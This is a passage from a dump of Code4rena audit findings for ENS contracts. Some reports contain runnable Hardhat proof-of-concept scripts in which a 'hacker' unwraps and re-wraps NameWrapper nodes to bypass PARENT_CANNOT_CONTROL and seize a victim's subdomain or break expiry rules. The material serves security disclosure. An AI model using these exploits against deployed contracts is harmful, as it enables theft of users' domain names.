+ The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`) + The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero. + When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`  The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.  Specifically, considering the following scenario  + The hacker owns a domain (or a 2LD), e.g., `base.eth` + The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`     + The expiry should be as large as possible + Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`     + The expiry should be as large as possible + The hacker unwraps his sub-domain, i.e., `sub1.base.eth` + The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`     + The expiry can be small than the one of sub2.sub1.base.eth      The root cause _seems_ that we should not zero out the expiry when burning a node if the node holds any subnode.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`  ### PoC / Attack Scenario  There is a PoC file named `poc5.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc5.js  ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 5', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + The hacker owns a domain (or a 2LD), e.g., base.eth      *  + The hacker assigns a sub-domain to himself, e.g., sub1.base.eth      *      + The expiry should be as large as possible      *  + Hacker assigns a sub-sub-domain, e.g., sub2.sub1.base.eth      *      + The expiry should be as large as possible      *  + The hacker unwraps his sub-domain, i.e., sub1.base.eth      *  + The hacker re-wraps his sub-domain, i.e., sub1.base.eth      *      + The expiry can be small than the one of sub2.sub1.base.eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       const block = await provider.getBlock(await provider.getBlockNumber())       const expiry = block.timestamp + 86400       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedTokenId))[1]       ).to.equal(expiry)        // assign a submomain       const subLabel = 'sub1'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[1]       ).to.equal(expiry)        // assign a subsubmomain       const subSubLabel = 'sub2'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       ).to.equal(expiry)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap his wrappedSubTokenId by NameWrapper.setSubnodeOwner       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         expiry - 7200       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: the expiry of sub1.base.eth is smaller than the one of sub2.sub1.base.eth       const sub1_expiry = (await NameWrapper.getFuses(wrappedSubTokenId))[1]       const sub2_expiry = (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       console.log('sub1 expiry:', sub1_expiry)       console.log('sub2 expiry:', sub2_expiry)       expect(sub1_expiry.toNumber()).to.be.lessThan(sub2_expiry.toNumber())     })   }) }) ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/186", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/184", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/183", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/182", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "ERC1155Fuse: `_transfer` does not revert when sent to the old owner", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284   # Vulnerability details  ## Impact  MED - the function of the protocol could be impacted  The `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.  ## Proof of Concept  According to the EIP-1155 standard for the `safeTransferFrom`:  > MUST revert if balance of holder for token `_id` is lower than the `_value` sent.   Let's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, \"\")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard. It can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.  ```solidity // https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284 // wrapper/ERC1155Fuse.sol::_transfer // ERC1155Fuse::safeTransferFrom uses _transfer  274     function _transfer( 275         address from, 276         address to, 277         uint256 id, 278         uint256 amount, 279         bytes memory data 280     ) internal { 281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id); 282         if (oldOwner == to) { 283             return; 284         } ```  ## Tools Used  none  ## Recommended Mitigation Steps  Revert even if the `to` address already owns the token.    "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/178", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/176", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Not checking if `newOwner` is `address(0)`", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "dnssec"], "target": "2022-07-ens-findings", "body": "Not checking if `newOwner` is `address(0)`"}, {"title": "[PNM-001] `PARENT_CANNOT_CONTROL` can be bypassed by maliciously unwrapping parent node", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/173", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74   # Vulnerability details  ### Description  By design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.  However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.   Considering the following attack scenario:  + Someone owns a domain (or a 2LD), e.g., _poc.eth_ + The domain owner assigns a sub-domain to the hacker, e.g., _hack.poc.eth_      + This sub-domain should not burn `CANNOT_UNWRAP`      + This sub-domain can burn `PARENT_CANNOT_CONTROL` + Hacker assigns a sub-sub-domain to a victim user, e.g., _victim.hack.poc.eth_ + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      + The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally + However, the hacker then unwraps his sub-domain, i.e., _hack.poc.eth_ + The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain      + He can reassign himself as the owner of the _victim.hack.poc.eth_ + The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., _victim.hacker.poc.eth_  The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.   ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.   ### PoC / Attack Scenario  There are two attached PoC files, `poc1.js` and `poc2.js`. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario.  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc1.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 1', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'register'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain for the hacker       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // hacker signed a submomain for a victim user       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const wrappedSubTokenId = namehash(subLabel + '.' + label + '.eth')       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubTokenId       await NameWrapperV.setFuses(wrappedSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(127)        // the hacker unwraps his 2LD token       await NameWrapperH.unwrapETH2LD(labelHash, hacker, hacker)       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(hacker)       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner       await EnsRegistryH.setSubnodeOwner(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap the sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(           encodeName(subLabel + '.' + label + '.eth'),           hacker,           EMPTY_ADDRESS       )        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(0)     })   }) }) ```  #### poc2.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 2', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + Someone owns a domain (or a 2LD), e.g., poc.eth      *  + The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth      *      + This sub-domain should not burn `CANNOT_UNWRAP`      *      + This sub-domain can burn `PARENT_CANNOT_CONTROL`      *  + Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth      *  + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      *  + The hacker unwraps his sub-domain, i.e., hack.poc.eth      *  + The hacker invokes `ENSRegistry::setSubnodeOwner` on the sub-sub-domain      *      + He can reassign himself as the owner of the victim.hack.poc.eth      *  + The sub-sub-domain is now owned by the hacker with more permissive fuses      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'poc'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         dev,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(dev)        // signed a submomain for the hacker       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapper.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // hacker signed a subsubmomain for a victim user       const subSubLabel = 'victim'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubSubTokenId       await NameWrapperV.setFuses(wrappedSubSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(127)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSubSubTokenId as himself       await EnsRegistryH.setSubnodeOwner(wrappedSubTokenId, subSubLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(hacker)          // the hacker re-wrap the sub sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(subSubDomain), hacker, EMPTY_ADDRESS)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(0)     })   }) }) ```  "}, {"title": "The hash to be `commit()` before `register()` should not be computed through the RPC call", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/172", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-ens-findings", "body": "The hash to be `commit()` before `register()` should not be computed through the RPC call"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/170", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/169", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "No Transfer Ownership Pattern in Ownable.sol and Owned.sol", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "dnssec"], "target": "2022-07-ens-findings", "body": "No Transfer Ownership Pattern in Ownable.sol and Owned.sol"}, {"title": "The `unwrapETH2LD` use `transferFrom` instead of `safeTransferFrom` to transfer ERC721 token", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/157", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "sponsor disputed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346   # Vulnerability details  ### Impact  The `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract  ### Proof of Concept  Should a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers. Plus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-);   `Usage of this method is discouraged, use safeTransferFrom whenever possible.`  ### Tools Used  Manual Review  ### Recommended Mitigation Steps  ```diff     function unwrapETH2LD(         bytes32 labelhash,         address newRegistrant,         address newController     ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {         _unwrap(_makeNode(ETH_NODE, labelhash), newController); -       registrar.transferFrom( +       registrar.safeTransferFrom(             address(this),             newRegistrant,             uint256(labelhash)         );     } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/150", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/149", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/148", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/145", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/144", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/138", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/137", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/136", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/135", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "transfer() depends on gas consts", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/133", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204   # Vulnerability details  ## Impact `transfer()` forwards 2300 